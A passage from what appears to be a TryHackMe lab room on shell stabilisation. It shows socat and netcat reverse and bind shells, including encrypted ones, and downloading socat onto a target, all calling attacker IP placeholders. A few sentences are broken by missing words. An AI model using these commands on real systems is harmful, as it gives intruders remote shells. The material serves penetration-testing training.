The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to **LINUX** targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary (opens in new tab)](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

First, open another terminal and run `stty -a`. This will give you a large stream of output. Note down the values for "rows" and columns:

![](https://assets.tryhackme.com/additional/imgur/7aOKtlO.png)

Next, in your reverse/bind shell, type in:

`stty rows <number>`  

and

`stty cols <number>`  

Filling in the numbers you got from running the command in your own terminal.

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

---

Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!

Once again, let's start with reverse shells.

_Reverse Shells_

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:  

`socat TCP-L:<port> -`  

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.

On Windows we would use this command to connect back:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`  

The "pipes" option is used to force

(or cmd.exe) to use Unix style standard input and output.  

This is the equivalent command for a Linux Target:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`  

_Bind Shells_

On a

target we would use the following command:

`socat TCP-L:<PORT> EXEC:"bash -li"`  

On a Windows target we would use this command for our listener:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`  

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.  

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

`socat TCP:<TARGET-IP>:<TARGET-PORT> -`


Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is _significantly_ more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:  

``socat TCP-L:<port> FILE:`tty`,raw,echo=0``  

Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current

as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary (opens in new tab)](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.

The special command is as follows:

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`  

This is a handful, so let's break it down.

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
    
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilises the terminal, attempting to "normalise" it.

That's a lot to take in, so let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:

![](https://assets.tryhackme.com/additional/imgur/etAuYzz.png)

Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding `-d -d` into the command. This is very useful for experimental purposes, but is not usually necessary for general use.


We covered how to create basic shells in the previous task, so that syntax will not be covered again here. Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells. We'll cover a few examples at the end of the task, but first let's talk about certificates.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.  

We then need to merge the two created files into a single `.pem` file:

`cat shell.key shell.crt > shell.pem`

Now, when we set up our reverse shell listener, we use:
  
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`  

This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate _must_ be used on whichever device is listening.  

To connect back, we would use:

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`  

The same technique would apply for a bind shell:

Target:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  

Attacker:

`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`  

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

The following image shows an OPENSSL Reverse shell from a

target. As usual, the target is on the right, and the attacker is on the left:

![](https://assets.tryhackme.com/additional/imgur/UbOPN9q.png)